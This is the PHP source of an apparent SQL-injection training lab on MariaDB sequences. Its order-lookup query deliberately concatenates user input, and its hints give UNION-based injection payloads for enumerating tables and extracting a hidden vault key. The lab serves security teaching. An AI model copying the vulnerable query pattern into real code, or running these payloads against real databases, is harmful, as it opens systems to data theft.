<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    $res = mysqli_query(
        $conn,
        "SELECT vault_key FROM sequence_vault WHERE id=1 LIMIT 1"
    );
    $row = mysqli_fetch_assoc($res);

    if ($row && $submitted === $row['vault_key']) {
        $_SESSION['mariadb_lab5_solved'] = true;
        header("Location: " . url_lab_from_slug("mariadb/lab5", $mode, $_GET['ref'] ?? ''));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 5. Sequence Object Injection</h3>

    <h4>Scenario</h4>
    <p>
        An order management system displays order details based on order reference numbers.
        The application uses MariaDB <strong>sequences</strong>: a feature not available in
        MySQL: for generating unique order IDs.
    </p>
    <p>
        MariaDB sequences are first-class database objects (like in PostgreSQL and Oracle)
        that generate auto-incrementing values without locking a table:
    </p>

    <div class="terminal">
        <div class="terminal-header">
            <span class="terminal-dot red"></span>
            <span class="terminal-dot yellow"></span>
            <span class="terminal-dot green"></span>
            <span class="terminal-title">Sequences. Concept</span>
        </div>
        <div class="terminal-body">
            <span class="prompt">mariadb&gt; </span>CREATE SEQUENCE order_seq START WITH 1000 INCREMENT BY 1;<br><br>
            <span class="prompt">mariadb&gt; </span>SELECT NEXT VALUE FOR order_seq;<br>
            <span class="comment">-- Returns: 1000 (then 1001, 1002, ...)</span><br><br>
            <span class="prompt">mariadb&gt; </span>SELECT PREVIOUS VALUE FOR order_seq;<br>
            <span class="comment">-- Returns: last generated value for this session</span><br><br>
            <span class="prompt">mariadb&gt; </span>SELECT * FROM information_schema.sequences;<br>
            <span class="comment">-- Lists all sequence objects in the server</span>
        </div>
    </div>

    <h4>Objective</h4>
    <p>
        The order lookup is vulnerable to injection. Use UNION-based extraction to find
        the hidden <code>sequence_vault</code> table. As a bonus, try querying the
        <code>NEXT VALUE FOR order_seq</code> to observe MariaDB's sequence behavior.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. The query returns 3 columns (id, order_ref, amount).<br>
        2. Enumerate tables: <code>' UNION SELECT table_name, table_type, NULL FROM information_schema.tables WHERE table_schema=database() -- -</code><br>
        3. Check sequences: <code>' UNION SELECT sequence_name, start_value, NULL FROM information_schema.sequences WHERE sequence_schema=database() -- -</code><br>
        4. Get next sequence value: <code>' UNION SELECT NEXT VALUE FOR order_seq, NULL, NULL -- -</code><br>
        5. Extract the flag: <code>' UNION SELECT vault_key, NULL, NULL FROM sequence_vault -- -</code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mariadb_lab5_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You discovered MariaDB sequence objects and extracted the vault key from the hidden table.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Order Lookup</h4>
    <form method="POST" class="form-row">
<input type="text" name="ref" class="input" placeholder="Enter order reference (try: ORD-1000)" value="<?= htmlspecialchars($_POST['ref'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Lookup</button>
    </form>
</div>

<?php
if (isset($_POST['ref'])) {
    $ref = $_POST['ref'];

    // INTENTIONALLY VULNERABLE: direct string concatenation
    $query = "SELECT id, order_ref, amount FROM orders WHERE order_ref = '$ref'";

    // Show the executed query in a terminal block
    echo '<div class="terminal query-output">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MariaDB Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">mariadb&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    // Execute and display results
    try {
    $result = mysqli_query($conn, $query);

    if (!$result) {
        echo '<div class="result-error result-box">';
        echo '<strong>MariaDB Error:</strong><br>' . htmlspecialchars(mysqli_error($conn));
        echo '</div>';
    } else {
        $rows = [];
        while ($row = mysqli_fetch_assoc($result)) {
            $rows[] = $row;
        }

        if (empty($rows)) {
            echo '<div class="result-warning result-box">No order found with that reference.</div>';
        } else {
            echo '<table class="result-table">';
            echo '<tr><th>ID</th><th>Order Ref</th><th>Amount</th></tr>';
            foreach ($rows as $row) {
                echo '<tr>';
                echo '<td>' . htmlspecialchars($row['id'] ?? '') . '</td>';
                echo '<td>' . htmlspecialchars($row['order_ref'] ?? '') . '</td>';
                echo '<td>$' . htmlspecialchars($row['amount'] ?? '') . '</td>';
                echo '</tr>';
            }
            echo '</table>';
        }
    }
    } catch (mysqli_sql_exception $e) {
        echo '<div class="result-error result-box">';
        echo '<strong>MariaDB Error:</strong><br>' . htmlspecialchars($e->getMessage());
        echo '</div>';
    }
}
?>

<?php endif; ?>
